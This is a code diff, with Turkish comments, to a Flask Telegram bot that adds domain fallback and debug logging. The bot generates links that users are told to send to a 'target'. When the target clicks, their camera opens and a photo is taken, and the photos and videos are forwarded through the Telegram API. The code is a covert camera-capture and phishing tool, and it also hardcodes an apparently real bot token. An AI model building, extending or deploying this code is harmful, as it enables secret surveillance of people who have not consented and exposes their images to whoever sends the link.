@@ -10,12 +10,14 @@ import requests
 TOKEN = os.environ.get("BOT_TOKEN", "8845469880:AAEEENGVv_igk7_DzrgMdK2UGG9Dnzva8VY")
 API_URL = "https://api.telegram.org/bot" + TOKEN
 
+# Domain algilama - COKLU kaynak
 RAILWAY_DOMAIN = os.environ.get("RAILWAY_PUBLIC_DOMAIN") or os.environ.get("RAILWAY_STATIC_URL")
-if RAILWAY_DOMAIN:
-    WEBHOOK_URL = "https://" + RAILWAY_DOMAIN
-else:
-    WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "https://your-app.up.railway.app")
+if not RAILWAY_DOMAIN:
+    # Fallback: RAILWAY_SERVICE_NAME varsa onu kullan
+    svc = os.environ.get("RAILWAY_SERVICE_NAME", "cam-bot")
+    RAILWAY_DOMAIN = svc + ".up.railway.app"
 
+WEBHOOK_URL = "https://" + RAILWAY_DOMAIN
 PORT = int(os.environ.get("PORT", 5000))
 
 user_tokens = {}
@@ -24,6 +26,11 @@ logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
 app = Flask(__name__, static_folder="static")
+
+logger.info("BOT_TOKEN: " + TOKEN[:10] + "...")
+logger.info("RAILWAY_DOMAIN: " + RAILWAY_DOMAIN)
+logger.info("WEBHOOK_URL: " + WEBHOOK_URL)
+logger.info("PORT: " + str(PORT))
 
 # ==================== TELEGRAM API FUNCTIONS ====================
 def send_message(chat_id, text, reply_markup=None):
@@ -36,38 +43,50 @@ def send_message(chat_id, text, reply_markup=None):
     if reply_markup:
         payload["reply_markup"] = reply_markup
     try:
-        requests.post(url, json=payload, timeout=10)
+        r = requests.post(url, json=payload, timeout=10)
+        logger.info("send_message status: " + str(r.status_code))
+        return r.json()
     except Exception as e:
         logger.error("send_message error: " + str(e))
+        return None
 
 def send_photo(chat_id, photo_bytes, caption=""):
     url = API_URL + "/sendPhoto"
     files = {"photo": ("photo.jpg", photo_bytes, "image/jpeg")}
     data = {"chat_id": chat_id, "caption": caption, "parse_mode": "Markdown"}
     try:
-        requests.post(url, files=files, data=data, timeout=30)
+        r = requests.post(url, files=files, data=data, timeout=30)
+        logger.info("send_photo status: " + str(r.status_code))
+        return r.json()
     except Exception as e:
         logger.error("send_photo error: " + str(e))
+        return None
 
 def send_video(chat_id, video_bytes, caption=""):
     url = API_URL + "/sendVideo"
     files = {"video": ("video.webm", video_bytes, "video/webm")}
     data = {"chat_id": chat_id, "caption": caption, "parse_mode": "Markdown"}
     try:
-        requests.post(url, files=files, data=data, timeout=30)
+        r = requests.post(url, files=files, data=data, timeout=30)
+        logger.info("send_video status: " + str(r.status_code))
+        return r.json()
     except Exception as e:
         logger.error("send_video error: " + str(e))
+        return None
 
 # ==================== ROUTES ====================
 @app.route("/" + TOKEN, methods=["POST"])
 def telegram_webhook():
     json_data = request.get_json()
+    logger.info("Webhook received: " + str(json_data))
 
     if "message" in json_data and "text" in json_data["message"]:
         chat_id = json_data["message"]["chat"]["id"]
         user_id = json_data["message"]["from"]["id"]
         username = json_data["message"]["from"].get("username", "Bilinmiyor")
         text = json_data["message"]["text"]
+
+        logger.info("Message from @" + username + ": " + text)
 
         if text == "/start":
             token = str(uuid.uuid4()).replace("-", "")[:16]
@@ -78,6 +97,7 @@ def telegram_webhook():
             }
 
             link = WEBHOOK_URL + "/c/" + token
+            logger.info("Generated link: " + link)
 
             keyboard = {
                 "inline_keyboard": [[{"text": "Linke Git", "url": link}]]
@@ -85,7 +105,8 @@ def telegram_webhook():
 
             msg = "Merhaba @" + username + "!\n\nOzel Linkiniz:\n" + link + "\n\nBu linki hedefe gonderin. Hedef linke tiklayinca kamera acilir ve fotograf cekilir."
 
-            send_message(chat_id, msg, reply_markup=keyboard)
+            result = send_message(chat_id, msg, reply_markup=keyboard)
+            logger.info("Send result: " + str(result))
 
     return "OK", 200
 
@@ -140,7 +161,7 @@ def upload_video(token):
 
 @app.route("/")
 def home():
-    return "Bot Aktif!"
+    return "Bot Aktif! Domain: " + RAILWAY_DOMAIN
 
 # ==================== MAIN ====================
 if __name__ == "__main__":
